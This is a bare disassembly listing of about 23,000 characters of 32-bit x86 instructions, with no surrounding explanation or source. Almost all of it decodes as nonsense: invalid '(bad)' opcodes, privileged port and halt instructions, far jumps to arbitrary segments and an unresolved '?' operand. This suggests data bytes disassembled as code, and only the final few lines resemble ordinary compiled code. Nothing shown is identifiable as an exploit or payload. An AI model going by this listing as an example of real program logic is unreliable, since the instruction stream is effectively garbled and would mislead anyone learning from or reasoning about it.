  41feea:	inc    eax
  41feeb:	jo     0x41fe86
  41feed:	imul   esp,ebx,0x7dfcde7
  41fef3:	push   eax
  41fef4:	loope  0x41feb9
  41fef6:	icebp  
  41fef7:	mov    ds:0xe8f366ac,eax
  41fefc:	rcl    DWORD PTR [edi-0x47],cl
  41feff:	jmp    0x8c18:0x97a86522
  41ff06:	or     BYTE PTR [edi-0x4ba1bbcc],al
  41ff0c:	lds    edi,FWORD PTR [ecx+0xe]
  41ff0f:	inc    ecx
  41ff10:	sub    DWORD PTR [ebp+ebx*2-0x36],esi
  41ff14:	sbb    DWORD PTR [ecx],ebx
  41ff16:	cmp    eax,0x5d674898
  41ff1b:	cs addr16 cli 
  41ff1e:	out    0xe3,al
  41ff20:	mov    ch,0xc
  41ff22:	and    eax,0x1ee6dd9
  41ff27:	ret    0xece
  41ff2a:	cld    
  41ff2b:	jmp    0xb67a:0x460d20f3
  41ff32:	test   eax,0x8a4ec137
  41ff37:	mov    bl,0x43
  41ff39:	lea    ecx,[ecx-0x50bef28e]
  41ff3f:	(bad)  
  41ff41:	sbb    BYTE PTR [esi],ch
  41ff43:	mov    cl,0xbb
  41ff45:	xor    eax,0x88560cbd
  41ff4a:	jecxz  0x41ff3a
  41ff4c:	ret    0x19a4
  41ff4f:	jo     0x41ff5f
  41ff51:	adc    DWORD PTR [ebx+0x15],0x7e
  41ff55:	in     eax,0xde
  41ff57:	mov    edi,0xd62febc8
  41ff5c:	inc    edi
  41ff5d:	out    dx,eax
  41ff5e:	test   DWORD PTR ss:[edi-0x37],ebp
  41ff62:	sbb    BYTE PTR [ebx],dh
  41ff64:	(bad)  
  41ff65:	mov    dl,dl
  41ff67:	or     DWORD PTR [edx+0x19],esi
  41ff6a:	scas   eax,DWORD PTR es:[edi]
  41ff6b:	div    DWORD PTR [edi+0x27]
  41ff6e:	outs   dx,BYTE PTR ds:[esi]
  41ff6f:	push   0xbb80bb14
  41ff74:	sbb    DWORD PTR [ebp+0x7354a6bc],0x1d
  41ff7b:	pop    es
  41ff7c:	adc    edx,DWORD PTR [ebp+0xef56c10]
  41ff82:	jno    0x41ff7e
  41ff84:	or     al,0x30
  41ff86:	call   0x4004:0x68d35eb6
  41ff8d:	xchg   esi,eax
  41ff8e:	adc    DWORD PTR [edi],0x3c
  41ff91:	xchg   ebx,eax
  41ff92:	in     eax,dx
  41ff93:	or     cl,dh
  41ff95:	stc    
  41ff96:	xor    ah,BYTE PTR [ecx+0x2a]
  41ff99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff9a:	aam    0x64
  41ff9c:	adc    al,0x72
  41ff9e:	cdq    
  41ff9f:	loop   0x420020
  41ffa1:	mov    ds:0x3f4f61af,eax
  41ffa6:	sti    
  41ffa7:	mov    ds:0x662a03b9,eax
  41ffac:	inc    edx
  41ffad:	dec    ebp
  41ffae:	mov    ebp,0xac33da2e
  41ffb3:	test   eax,0xc5ffc0fd
  41ffb8:	push   ecx
  41ffb9:	push   eax
  41ffba:	pop    ss
  41ffbb:	xor    eax,0xf9403f2b
  41ffc0:	cmp    bl,ch
  41ffc2:	imul   ebx,DWORD PTR ds:0x82a74aa5,0xfffffff7
  41ffc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffca:	adc    eax,0xa6cced09
  41ffcf:	test   al,0xf0
  41ffd1:	lods   al,BYTE PTR ds:[esi]
  41ffd2:	(bad)  [ebx-0x228439ca]
  41ffd8:	push   es
  41ffd9:	jmp    0x41ffa8
  41ffdb:	push   0xffffffbb
  41ffdd:	lea    esp,[edx+0x9]
  41ffe0:	(bad)  
  41ffe1:	sbb    dl,BYTE PTR [esp+eax*1]
  41ffe4:	sbb    edi,DWORD PTR [esi-0x24af523]
  41ffea:	retf   
  41ffeb:	sbb    eax,0xef19759d
  41fff0:	lods   eax,DWORD PTR ds:[esi]
  41fff1:	(bad)  
  41fff2:	in     eax,dx
  41fff3:	hlt    
  41fff4:	and    eax,0x2907e742
  41fff9:	push   0xffffff8b
  41fffb:	dec    edi
  41fffc:	lods   al,BYTE PTR ds:[esi]
  41fffd:	hlt    
  41fffe:	sbb    al,0x3
  420000:	mov    dh,0x5b
  420002:	out    0x8f,al
  420004:	sub    eax,0xafaf5fa0
  420009:	push   esp
  42000a:	ret    
  42000b:	(bad)  
  42000c:	call   0xb6c2:0xacc1f495
  420013:	or     eax,DWORD PTR [esi-0x66280cd0]
  420019:	cmp    eax,DWORD PTR [eax+0x49]
  42001c:	repz sbb eax,DWORD PTR [esp+edi*4+0xed6f588]
  420024:	fcomp  QWORD PTR [eax-0x247859a9]
  42002a:	ja     0x41ffcc
  42002c:	out    dx,al
  42002d:	ins    BYTE PTR es:[edi],dx
  42002e:	aaa    
  42002f:	or     DWORD PTR [ebx],edi
  420031:	mov    esp,0xd069d108
  420036:	dec    ebp
  420037:	pmuludq mm4,QWORD PTR [ebx+0xbe30477]
  42003e:	jno    0x420007
  420040:	idiv   bh
  420042:	push   ss
  420043:	call   0xd9964796
  420048:	test   dl,al
  42004a:	cdq    
  42004b:	ins    DWORD PTR es:[edi],dx
  42004c:	add    edi,DWORD PTR ds:0x782329d8
  420052:	cwde   
  420053:	in     eax,0xe5
  420055:	dec    ebp
  420056:	in     eax,0x9
  420058:	adc    eax,0x136edc60
  42005d:	pop    ebp
  42005e:	mov    ebp,0xbd873da3
  420063:	adc    edx,DWORD PTR [esi]
  420065:	xor    BYTE PTR [ecx-0x41fed237],dh
  42006b:	mov    ecx,0x6d21ba7d
  420070:	repz adc eax,DWORD PTR [esi+eax*1+0x3]
  420075:	cdq    
  420076:	pop    es
  420077:	lods   eax,DWORD PTR ds:[esi]
  420078:	adc    dl,BYTE PTR [edx+0x28]
  42007b:	pop    esp
  42007c:	or     eax,0xf9119d8a
  420081:	ja     0x420048
  420083:	ret    
  420084:	js     0x4200a1
  420086:	loop   0x420077
  420088:	cmc    
  420089:	sbb    eax,0xe54fac5
  42008e:	out    dx,eax
  42008f:	inc    ecx
  420090:	mov    esi,0x98c6396d
  420095:	jp     0x4200b5
  420097:	iret   
  420098:	clc    
  420099:	mov    esi,0xb3f98eba
  42009e:	add    DWORD PTR [esi],eax
  4200a0:	xlat   BYTE PTR ds:[ebx]
  4200a1:	xchg   esi,eax
  4200a2:	xor    eax,0xb1863172
  4200a7:	add    edx,DWORD PTR [ecx-0x23f63ee]
  4200ad:	lods   al,BYTE PTR ds:[esi]
  4200ae:	push   esi
  4200af:	aad    0xf1
  4200b1:	mov    esp,0x2aa6f066
  4200b6:	cwde   
  4200b7:	adc    al,0x8e
  4200b9:	push   edi
  4200ba:	int    0x22
  4200bc:	ficom  DWORD PTR ds:0x875a363c
  4200c2:	ret    
  4200c3:	nop
  4200c4:	sbb    dl,BYTE PTR [ebp+ecx*2-0x48511333]
  4200cb:	jo     0x420112
  4200cd:	mov    cl,0x17
  4200cf:	jmp    0x420145
  4200d1:	in     eax,0x25
  4200d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200d4:	inc    eax
  4200d5:	adc    ecx,ebx
  4200d7:	(bad)  
  4200d8:	and    eax,0xb9f580e1
  4200dd:	shl    DWORD PTR [ebx+esi*4],0x22
  4200e1:	jg     0x420078
  4200e3:	jno    0x4200d3
  4200e5:	mov    ebx,0x475ddf84
  4200ea:	adc    BYTE PTR ds:0x9ec7092a,dl
  4200f0:	adc    BYTE PTR [esi],ah
  4200f2:	inc    eax
  4200f3:	xlat   BYTE PTR ds:[ebx]
  4200f4:	repz pusha 
  4200f6:	cdq    
  4200f7:	cmp    DWORD PTR [edi-0x60e4c1b0],0xffffffc8
  4200fe:	out    dx,al
  4200ff:	xchg   edi,eax
  420100:	xchg   edi,eax
  420101:	sbb    eax,0xc85f4946
  420106:	push   ebx
  420107:	ss mov ah,cl
  42010a:	call   0xe0d2:0x7d5a34ed
  420111:	outs   dx,DWORD PTR ds:[esi]
  420112:	add    BYTE PTR [ebp+0x5c22265f],bh
  420118:	sbb    esp,0xbdefd192
  42011e:	mov    DWORD PTR [ebx-0x4d],edi
  420121:	jae    0x420103
  420123:	xor    DWORD PTR [edi],ebx
  420125:	mov    ch,0x1f
  420127:	jmp    0x4200fb
  420129:	mov    cl,0x4f
  42012b:	cmp    bl,BYTE PTR [ebx-0x5fc5cdbe]
  420131:	pop    eax
  420132:	cmp    ebp,DWORD PTR [ebp-0x7a]
  420135:	jnp    0x4200f2
  420137:	mov    bl,0x5a
  420139:	out    0xc1,eax
  42013b:	cwde   
  42013c:	and    ebp,eax
  42013e:	or     ah,BYTE PTR [ecx+eax*1+0x3d783f06]
  420145:	fcom   DWORD PTR [edi-0x2]
  420148:	xchg   edi,eax
  420149:	jmp    0x4e1c:0xe0d2fd5a
  420150:	es es mov edx,0xf3471126
  420157:	cdq    
  420158:	stos   BYTE PTR es:[edi],al
  420159:	jp     0x420128
  42015b:	cmp    dh,BYTE PTR [esi+edx*8-0x2674d2e9]
  420162:	(bad)  
  420163:	pusha  
  420164:	cmp    BYTE PTR [edi-0x14],al
  420167:	sbb    edx,DWORD PTR [edx]
  420169:	gs pop edx
  42016b:	dec    ecx
  42016c:	inc    DWORD PTR [edi]
  42016e:	lods   al,BYTE PTR ds:[esi]
  42016f:	callw  0x5ee6
  420173:	scas   eax,DWORD PTR es:[edi]
  420174:	ins    DWORD PTR es:[edi],dx
  420175:	adc    esi,0x24c49f9b
  42017b:	in     al,0xbb
  42017d:	lods   eax,DWORD PTR ds:[esi]
  42017e:	inc    ebx
  42017f:	add    ebx,edi
  420181:	cmp    bl,ch
  420183:	pushf  
  420184:	rcl    esi,cl
  420186:	pushf  
  420187:	jnp    0x4201e0
  420189:	cwde   
  42018a:	push   es
  42018b:	add    bh,bh
  42018d:	nop
  42018e:	jb     0x420176
  420190:	dec    ebp
  420191:	inc    ebx
  420192:	jmp    0xa3c4:0x9bafb82a
  420199:	fst    QWORD PTR [ebx-0x44e63e0e]
  42019f:	call   0x5f9f:0x7df351e7
  4201a6:	push   ebx
  4201a7:	sbb    eax,0x3648bcc2
  4201ac:	dec    ebp
  4201ae:	jmp    DWORD PTR [edi+0x27]
  4201b1:	aas    
  4201b2:	push   ebx
  4201b3:	jle    0x420189
  4201b5:	jmp    0x420235
  4201b7:	outs   dx,DWORD PTR ds:[esi]
  4201b8:	ss loopne 0x420186
  4201bb:	adc    BYTE PTR [edi+0x3bc6e569],ah
  4201c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201c2:	jb     0x4201fc
  4201c4:	call   0xcd3f07f7
  4201c9:	mov    dh,0x28
  4201cb:	adc    ah,0x12
  4201ce:	xchg   edi,eax
  4201cf:	pop    ds
  4201d0:	std    
  4201d1:	in     al,0xc2
  4201d3:	repz mov ds:0x79548abe,al
  4201d9:	inc    ecx
  4201da:	scas   al,BYTE PTR es:[edi]
  4201db:	xor    ebx,DWORD PTR [esp+esi*8]
  4201de:	jmp    0x89d33e22
  4201e3:	(bad)  
  4201e4:	mov    DWORD PTR [ebx+0x2d],eax
  4201e7:	push   es
  4201e8:	and    BYTE PTR [ecx-0x362a8197],dh
  4201ee:	dec    edx
  4201ef:	jmp    0x420268
  4201f1:	push   0xffffffda
  4201f3:	fwait
  4201f4:	push   esi
  4201f5:	and    bl,BYTE PTR [edx-0x5]
  4201f8:	ins    DWORD PTR es:[edi],dx
  4201f9:	lds    ecx,FWORD PTR ds:0xfb3d26cf
  4201ff:	xchg   ecx,eax
  420200:	out    dx,al
  420201:	data16 mov BYTE PTR [ecx+0x18],dl
  420205:	sub    ecx,ecx
  420207:	jbe    0x42024d
  420209:	pop    ss
  42020a:	imul   ecx,DWORD PTR [esi-0x40],0xff6e0dc
  420211:	pusha  
  420212:	in     eax,dx
  420213:	jp     0x4201a9
  420215:	mov    al,ds:0x56d0d2c5
  42021a:	xchg   ecx,eax
  42021b:	lds    esi,FWORD PTR [eax]
  42021d:	adc    edx,DWORD PTR [esi-0x116914b1]
  420223:	dec    edx
  420224:	dec    eax
  420225:	mov    al,0x2b
  420227:	mov    ebp,0x3f048e49
  42022c:	sub    dh,BYTE PTR [ebx+0x33]
  42022f:	retf   0xa67b
  420232:	inc    ecx
  420233:	(bad)  
  420234:	fs xchg edx,eax
  420236:	inc    edx
  420237:	cdq    
  420238:	out    0xcb,al
  42023a:	jnp    0x42020e
  42023c:	into   
  42023d:	retf   
  42023e:	rol    esp,1
  420240:	adc    ebp,DWORD PTR ds:0x8fe722e7
  420246:	sbb    bl,BYTE PTR [edx]
  420248:	push   ebp
  420249:	mov    edi,0x959e41ac
  42024e:	scas   eax,DWORD PTR es:[edi]
  42024f:	adc    edi,ebp
  420251:	test   DWORD PTR [edi+eax*8],esi
  420254:	inc    ebx
  420255:	out    dx,al
  420256:	stos   DWORD PTR es:[edi],eax
  420257:	rol    DWORD PTR [ebx-0x3d],0x15
  42025b:	or     cl,BYTE PTR [edi+edi*8]
  42025e:	push   esp
  42025f:	outs   dx,DWORD PTR ds:[esi]
  420260:	rcr    BYTE PTR [esi],cl
  420262:	inc    ebp
  420263:	adc    ecx,DWORD PTR [ebx+0x254f7c52]
  420269:	xchg   edi,eax
  42026a:	xor    eax,0xc3b90bc4
  42026f:	lock pusha 
  420271:	and    al,BYTE PTR fs:[edi+0x151105bb]
  420278:	inc    ebx
  420279:	push   edi
  42027a:	scas   eax,DWORD PTR es:[edi]
  42027b:	les    ebp,FWORD PTR [ecx-0x1e2a711]
  420281:	repz cdq 
  420283:	xor    edx,DWORD PTR [ebx]
  420285:	int    0x13
  420287:	push   ecx
  420288:	into   
  420289:	test   al,0x15
  42028b:	dec    edx
  42028c:	jmp    0x57e07360
  420291:	or     DWORD PTR [ebx*4-0x4a825091],0xfffffff7
  420299:	and    al,0x6d
  42029b:	and    BYTE PTR fs:[edx-0x23],dl
  42029f:	dec    ecx
  4202a0:	push   eax
  4202a1:	push   0x6f
  4202a3:	add    BYTE PTR [ebp+0x1e146c64],bh
  4202a9:	mov    ecx,0xf2c886c2
  4202ae:	loope  0x4202e2
  4202b0:	inc    edx
  4202b1:	dec    ebp
  4202b2:	add    BYTE PTR [edi+0x3b648361],0x91
  4202b9:	pusha  
  4202ba:	fwait
  4202bb:	jno    0x420320
  4202bd:	jp     0x4202ac
  4202bf:	fs mov eax,0xfe86cae1
  4202c5:	lods   al,BYTE PTR ds:[esi]
  4202c6:	bound  esi,QWORD PTR [edi-0x1f]
  4202c9:	daa    
  4202ca:	mov    bl,0x4f
  4202cc:	mov    ch,0xd1
  4202ce:	jmp    0x6847:0xc23cfe98
  4202d5:	sbb    esi,DWORD PTR [ecx+0x29]
  4202d8:	out    0x20,eax
  4202da:	jnp    0x4202fc
  4202dc:	je     0x420305
  4202de:	mov    ebp,0xc42695c7
  4202e3:	mov    bl,0x50
  4202e5:	push   ecx
  4202e6:	ficomp DWORD PTR [edi]
  4202e8:	jns    0x4202d9
  4202ea:	sbb    ebp,esi
  4202ec:	mov    al,ds:0xfcec17a8
  4202f1:	mov    edx,cs
  4202f3:	dec    ebx
  4202f4:	in     eax,dx
  4202f5:	inc    edx
  4202f6:	pop    esp
  4202f7:	mov    dl,al
  4202f9:	jbe    0x42033c
  4202fb:	push   es
  4202fc:	cmp    dh,al
  4202fe:	lods   al,BYTE PTR ds:[esi]
  4202ff:	xchg   DWORD PTR [eax],esp
  420301:	test   edx,0x9740f7d1
  420307:	out    dx,al
  420308:	mov    edx,0x1401a783
  42030d:	aad    0x20
  42030f:	sub    eax,0x56e82e9
  420314:	(bad)  
  420315:	fnstsw WORD PTR [ecx+0x16]
  420318:	pop    es
  420319:	in     eax,0x22
  42031b:	repz xchg ebx,eax
  42031d:	out    0x54,al
  42031f:	or     esp,DWORD PTR [eax+0x66623ba5]
  420325:	dec    esp
  420326:	adc    ebx,ebx
  420328:	mov    eax,ds:0xb43c8a7
  42032d:	inc    edx
  42032e:	mov    ?,WORD PTR [eax+0x2cbbb07a]
  420334:	mov    al,0x82
  420336:	mov    al,ds:0x6950ee60
  42033b:	dec    ecx
  42033c:	sbb    DWORD PTR ds:0x75d2773c,eax
  420342:	in     eax,dx
  420343:	and    ah,0xfc
  420346:	xchg   ebx,eax
  420347:	(bad)  
  420348:	fldcw  WORD PTR [edi-0x34]
  42034b:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42034d:	jbe    0x42036b
  42034f:	and    BYTE PTR [di],dh
  420352:	aad    0xed
  420354:	out    0xf1,al
  420356:	jae    0x4203c8
  420358:	mov    ds:0x7f201f30,eax
  42035d:	nop
  42035e:	call   0xa55f18a8
  420363:	sbb    DWORD PTR [eax+0x22],0xffffffb4
  420367:	adc    DWORD PTR [ebx-0x3c],ecx
  42036a:	(bad)  
  42036b:	inc    esi
  42036c:	add    DWORD PTR [ecx+eax*4],0x46c02a9f
  420373:	sub    DWORD PTR [edi],eax
  420375:	mov    ebp,0x18adf0b6
  42037a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42037b:	retf   0x32ea
  42037e:	and    BYTE PTR [ebx+0x4f],ah
  420381:	imul   edi,DWORD PTR [eax],0xaf0b60d2
  420387:	fidiv  DWORD PTR [edx]
  420389:	jl     0x42033e
  42038b:	cdq    
  42038c:	mov    bh,0x3b
  42038e:	fisubr DWORD PTR [ebx]
  420390:	mov    ecx,0x1eab79ca
  420395:	mov    ch,0x80
  420397:	shl    eax,cl
  420399:	adc    al,0xdc
  42039b:	(bad)  
  42039c:	pop    esi
  42039d:	sti    
  42039e:	mov    esi,0x5ccf7b9f
  4203a3:	mov    edi,0x83254801
  4203a8:	aas    
  4203a9:	call   0xb4dc:0x407144d7
  4203b0:	rol    DWORD PTR [edi-0x1b68c1da],1
  4203b6:	stc    
  4203b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203b8:	sub    DWORD PTR [ecx+0x3bdc3384],esi
  4203be:	or     esi,DWORD PTR [ecx-0x73]
  4203c1:	loop   0x42041b
  4203c3:	mov    ecx,0x8643312b
  4203c8:	mov    al,ds:0xe3f1a234
  4203cd:	inc    edx
  4203ce:	enter  0xd272,0xca
  4203d2:	stos   DWORD PTR es:[edi],eax
  4203d3:	lock jp 0x42035e
  4203d6:	cmp    esp,edx
  4203d8:	int    0x85
  4203da:	inc    ebp
  4203db:	mov    eax,ds:0x951601f4
  4203e0:	loope  0x4203f5
  4203e2:	or     ecx,esp
  4203e4:	mov    ecx,0xe0c1cdb2
  4203e9:	push   0x4d
  4203eb:	jge    0x420429
  4203ed:	aam    0x2a
  4203ef:	inc    edi
  4203f0:	int3   
  4203f1:	cdq    
  4203f2:	(bad)  
  4203f3:	jns    0x420410
  4203f5:	fwait
  4203f6:	loop   0x420457
  4203f8:	retf   
  4203f9:	add    dh,BYTE PTR [edi]
  4203fb:	(bad)  
  4203fc:	dec    edi
  4203fd:	test   DWORD PTR [edi],edi
  4203ff:	add    DWORD PTR [esi-0x61],edi
  420402:	mov    edx,0x4f931980
  420407:	and    eax,0xe6e52bcc
  42040c:	shl    BYTE PTR [esi],1
  42040e:	test   BYTE PTR [ebp-0x2d055189],cl
  420414:	inc    esp
  420415:	aad    0xcb
  420417:	push   ds
  420418:	repz push ebp
  42041a:	adc    edi,ecx
  42041c:	pop    esp
  42041e:	stos   BYTE PTR es:[edi],al
  42041f:	mov    ch,BYTE PTR [edi]
  420421:	adc    bl,BYTE PTR [edi+0x5]
  420424:	add    eax,0xa6197e38
  420429:	pushf  
  42042a:	imul   esp,DWORD PTR [ecx+esi*8],0x23efffe6
  420431:	push   ss
  420432:	jb     0x42041e
  420434:	mov    bh,0xd3
  420436:	(bad)  
  420437:	mov    dl,0x9f
  420439:	sbb    ah,BYTE PTR [ebp+0x59392d41]
  42043f:	ins    DWORD PTR es:[edi],dx
  420440:	(bad)  
  420441:	jnp    0x420484
  420443:	int    0x5a
  420445:	xlat   BYTE PTR ds:[ebx]
  420446:	inc    esi
  420447:	xchg   ecx,eax
  420449:	shr    bl,0x61
  42044c:	push   ds
  42044d:	cmp    al,0x93
  42044f:	popa   
  420450:	jmp    0x6761:0xa966fe20
  420457:	ror    BYTE PTR [ebx-0x59b4fc8d],cl
  42045d:	dec    esi
  42045e:	pop    ebp
  42045f:	shl    BYTE PTR [esi-0x57ff09],1
  420465:	(bad)  
  420466:	icebp  
  420467:	call   0x31ff:0x4114b25b
  42046e:	mov    ecx,0xc31ca5ce
  420473:	sub    DWORD PTR [edx+0x4585f28b],esi
  420479:	inc    edx
  42047a:	enter  0xcff4,0xae
  42047e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42047f:	idiv   DWORD PTR [ebx]
  420481:	frstor [ebx-0x1d]
  420484:	push   ds
  420485:	fdiv   QWORD PTR [ebx]
  420487:	push   ebx
  420488:	jmp    0x3e8f2a85
  42048d:	ins    BYTE PTR es:[edi],dx
  42048e:	adc    DWORD PTR ds:0x3ef9a832,esp
  420494:	loopne 0x420448
  420496:	sub    al,0xa1
  420498:	daa    
  420499:	(bad)  
  42049a:	jl     0x42049d
  42049c:	jno    0x420436
  42049e:	push   0xffffff80
  4204a0:	(bad)  
  4204a1:	jl     0x4204cf
  4204a3:	inc    ebx
  4204a4:	stos   DWORD PTR es:[edi],eax
  4204a5:	jnp    0x420428
  4204a7:	xchg   ecx,esi
  4204a9:	in     eax,dx
  4204aa:	mov    BYTE PTR [ecx],bh
  4204ac:	lods   eax,DWORD PTR ds:[esi]
  4204ad:	dec    esi
  4204ae:	xchg   DWORD PTR [eax-0x23],ebx
  4204b1:	stc    
  4204b2:	fild   WORD PTR [ebx-0x4c]
  4204b5:	lds    ax,DWORD PTR [ecx-0x162fb24e]
  4204bc:	mov    eax,ds:0xdcff5ece
  4204c1:	mov    BYTE PTR [esi+0x3a],bl
  4204c4:	cmp    al,0x9e
  4204c6:	fmul   QWORD PTR [ebx]
  4204c8:	sub    DWORD PTR [ebp-0x718a4610],0xffffff80
  4204cf:	push   DWORD PTR [ecx-0x6d18dc79]
  4204d5:	loopne 0x42050d
  4204d7:	call   0x2cde3f32
  4204dc:	inc    ebp
  4204dd:	fsubr  DWORD PTR [ebx-0x5d]
  4204e0:	test   DWORD PTR [edx+0x854720c],edi
  4204e6:	lahf   
  4204e7:	pop    eax
  4204e8:	jmp    0x3a655d4f
  4204ed:	jno    0x42052e
  4204ef:	sub    eax,0xc8b4b8df
  4204f4:	mov    dh,0x6e
  4204f6:	ror    BYTE PTR [ebp-0x5bf5c27a],1
  4204fc:	sbb    DWORD PTR [ebp+0x7e],0xffffff8d
  420500:	ja     0x4204eb
  420502:	mov    esi,0xd6d670c8
  420507:	sbb    eax,0x30515cc2
  42050c:	ret    
  42050d:	jecxz  0x420502
  42050f:	scas   al,BYTE PTR es:[edi]
  420510:	cmp    ecx,DWORD PTR [ecx-0x751eed74]
  420516:	xlat   BYTE PTR ds:[ebx]
  420517:	xchg   ebx,eax
  420518:	inc    eax
  420519:	in     eax,dx
  42051a:	pop    esi
  42051b:	mov    eax,0x12145088
  420520:	inc    edi
  420521:	mov    esi,0xbbbc3dec
  420526:	loope  0x42053d
  420528:	jno    0x420506
  42052a:	add    eax,0xe19366df
  42052f:	call   0x34ba:0xbd8fcc0e
  420536:	(bad)  
  420537:	call   FWORD PTR [esi-0x76]
  42053a:	mov    edi,DWORD PTR [esi-0x5653a2a0]
  420540:	fmul   DWORD PTR [esi]
  420542:	cmp    bh,BYTE PTR ds:0x21d7fc1e
  420548:	inc    ebx
  420549:	jp     0x420598
  42054b:	call   0x68b504f4
  420550:	cmp    edx,DWORD PTR [eax+ebx*2-0x50]
  420554:	imul   esp,ebx,0x7a
  420557:	ror    BYTE PTR [edi+0x364c79f0],0x7b
  42055e:	mov    edx,0x8f2c2628
  420563:	test   DWORD PTR [ecx-0x3e38f7f4],esi
  420569:	jp     0x4205b1
  42056b:	mov    ebx,0x8754b705
  420570:	lods   eax,DWORD PTR ds:[esi]
  420571:	jo     0x420522
  420573:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420574:	cdq    
  420575:	mov    ebx,0xe29e885
  42057a:	pusha  
  42057b:	inc    esp
  42057c:	ror    BYTE PTR [ebp+0x7f],0x5
  420580:	dec    ebx
  420581:	inc    edi
  420582:	fimul  WORD PTR [eax]
  420584:	fnstcw WORD PTR [esi+0x4e40ebeb]
  42058a:	in     eax,dx
  42058b:	pop    edi
  42058d:	jae    0x420582
  42058f:	test   BYTE PTR [ebx+eiz*4-0x45],bl
  420593:	mov    bl,dh
  420595:	fsub   QWORD PTR [esi+0x6b]
  420598:	inc    ebp
  420599:	sub    BYTE PTR [esi],ch
  42059b:	lock pop eax
  42059d:	scas   eax,DWORD PTR es:[edi]
  42059e:	jne    0x42058e
  4205a0:	xchg   edi,eax
  4205a1:	bound  ebp,QWORD PTR ds:0xe3f61831
  4205a7:	fld    TBYTE PTR [ecx-0x39595178]
  4205ad:	push   ebx
  4205ae:	pushf  
  4205af:	jns    0x4205ab
  4205b1:	adc    BYTE PTR [eax+esi*8+0x33caff67],ah
  4205b8:	neg    BYTE PTR [ebx]
  4205ba:	fstp   DWORD PTR [edi-0x35]
  4205bd:	stos   DWORD PTR es:[edi],eax
  4205be:	retf   0x5336
  4205c1:	mov    cs,WORD PTR [esi+ecx*4-0x3d148c10]
  4205c8:	fistp  DWORD PTR [edx]
  4205ca:	into   
  4205cb:	shr    eax,cl
  4205cd:	sbb    al,0xa9
  4205cf:	dec    esp
  4205d0:	leave  
  4205d1:	push   edi
  4205d2:	push   ebp
  4205d3:	xchg   ebp,eax
  4205d4:	sti    
  4205d5:	jmp    0x5c999a3
  4205da:	jle    0x4205eb
  4205dc:	in     al,dx
  4205dd:	jle    0x42064b
  4205df:	sub    edi,ecx
  4205e1:	sar    DWORD PTR [ebx-0x5b],cl
  4205e4:	mov    ch,0xb
  4205e6:	call   0xfb548781
  4205eb:	cmp    cl,dh
  4205ed:	mov    ds:0x1d4e88a7,eax
  4205f2:	mov    BYTE PTR [ecx],ch
  4205f4:	bound  ebx,QWORD PTR [ecx+0x1551dbf6]
  4205fa:	mov    edi,0x75b00bd5
  4205ff:	push   0x45
  420601:	jge    0x4205f4
  420603:	jno    0x420657
  420605:	jnp    0x420614
  420607:	pop    ebx
  420608:	push   ds
  420609:	ret    0x2d47
  42060c:	inc    ebp
  42060d:	jl     0x4205b0
  42060f:	xchg   edi,eax
  420610:	xchg   ecx,eax
  420611:	(bad)  
  420612:	aad    0xbc
  420614:	addr16 xchg esp,eax
  420616:	push   es
  420617:	cs out 0x5a,al
  42061a:	xor    BYTE PTR [edx],al
  42061c:	(bad)
  420620:	gs leave 
  420622:	sub    BYTE PTR [ecx+0x357a498c],bh
  420628:	jle    0x420680
  42062a:	adc    al,0x73
  42062c:	in     al,0x43
  42062e:	sbb    eax,0x9441b341
  420633:	pushf  
  420634:	dec    edi
  420635:	xor    eax,0x2752a404
  42063a:	inc    eax
  42063b:	push   0xb8661eab
  420640:	xor    bl,bh
  420642:	mov    ds:0x1a3e6365,al
  420647:	out    0xb3,eax
  420649:	xchg   edx,eax
  42064a:	call   0x7625:0xeeb264f7
  420651:	sbb    BYTE PTR [esi],al
  420653:	jne    0x420613
  420655:	loope  0x420684
  420657:	fsubr  QWORD PTR [edi-0x7f]
  42065a:	mov    ebx,0xc7e30b71
  42065f:	leave  
  420660:	xor    bh,ah
  420662:	call   DWORD PTR [ecx-0x66]
  420665:	mov    bl,BYTE PTR [edx+0x40]
  420668:	mov    al,BYTE PTR [ecx+0x393a9ed1]
  42066e:	outs   dx,DWORD PTR ds:[esi]
  42066f:	popf   
  420670:	pop    esi
  420671:	xchg   ecx,eax
  420672:	cwde   
  420673:	jecxz  0x4205ff
  420675:	jl     0x4206e4
  420677:	pop    es
  420678:	mov    fs,WORD PTR ds:0x4b32be02
  42067e:	mov    WORD PTR [ecx+ebx*8-0x2c00ed71],es
  420685:	jg     0x4206c2
  420687:	ficomp WORD PTR [ecx+esi*8-0x3c]
  42068b:	arpl   WORD PTR [ebx+eiz*2+0x16],ax
  42068f:	xchg   DWORD PTR [eax],ecx
  420691:	shr    BYTE PTR [eax+edx*4],1
  420694:	inc    ebx
  420695:	sub    esp,0x9d348455
  42069b:	xchg   edi,eax
  42069c:	push   ss
  42069d:	xchg   edi,eax
  42069e:	ins    BYTE PTR es:[edi],dx
  42069f:	sub    al,0xd5
  4206a1:	out    0x78,eax
  4206a3:	jle    0x4206ad
  4206a5:	sbb    ecx,edi
  4206a7:	popf   
  4206a8:	popa   
  4206a9:	cwde   
  4206aa:	xchg   edi,eax
  4206ab:	jmp    FWORD PTR [esp+edi*8+0xa5dc588]
  4206b2:	push   ebx
  4206b3:	mov    ecx,0xa602772a
  4206b8:	pop    es
  4206b9:	sti    
  4206ba:	dec    esp
  4206bb:	sub    BYTE PTR [esi+0x7c38a7ea],dh
  4206c1:	xlat   BYTE PTR ds:[ebx]
  4206c2:	test   DWORD PTR [edi+0x24b77fe1],0x9570b6f5
  4206cc:	call   0x2d0158a
  4206d1:	mov    eax,0xc41932d3
  4206d6:	inc    esp
  4206d7:	jno    0xcd88f37c
  4206dd:	(bad)  
  4206de:	repz test BYTE PTR [esi*8-0x3ec2238b],ah
  4206e6:	sub    DWORD PTR [esi+ebx*4+0x7d89875d],ecx
  4206ed:	in     al,0x8b
  4206ef:	jge    0x4206f9
  4206f1:	xor    edi,ecx
  4206f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4206f6:	add    edi,edx
  4206f8:	cmp    ecx,edi
  4206fa:	je     0x42073c
  420700:	mov    ecx,DWORD PTR [ebp-0x18]
  420703:	add    ecx,eax
  420705:	mov    DWORD PTR [ebp-0x1c],ecx
